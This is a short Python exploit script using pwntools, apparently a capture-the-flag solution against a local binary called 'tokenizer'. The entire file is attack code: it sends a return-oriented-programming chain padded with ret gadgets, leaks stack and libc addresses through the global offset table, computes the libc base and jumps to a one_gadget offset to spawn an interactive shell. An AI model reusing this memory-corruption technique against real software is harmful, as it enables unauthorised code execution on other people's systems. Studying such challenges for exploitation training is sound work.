from pwn import *
#context.log_level='debug'
libc=ELF("./tokenizer").libc
p=process('./tokenizer')

#gdb.attach(p,'b *0x00000000040131F')

ret=0x8080808080401016
rdi=0x808080808040149b
rsi=0x8080808080401499
puts=0x8080808080401080
got=0x8080808080403f90
cout=0x8080808080404020
cin=0x8080808080404140
read=0x8080808080401030
magic=0x8080808080404288
reuse=0x8080808080401378
pay=p64(ret)*116+p64(magic)+p64(ret)*5+p64(rdi)+p64(cout)+p64(rsi)+p64(got)+p64(ret)+p64(reuse)
p.sendlineafter(": ",pay)
p.read(0x418)
stack=u64(p.read(6).ljust(8,'\x00'))
p.sendlineafter(": ",chr(0x80&0xff))
base=u64(p.readuntil("Please")[-12:-6].ljust(8,'\x00'))-(0x7ffff7711b70-0x7ffff765b000)
libc.address=base
pay="n132"
one=0x4f322
p.sendlineafter(": ",pay)
p.sendlineafter(": ",p64(one+base))
log.warning(hex(base))
p.interactive()

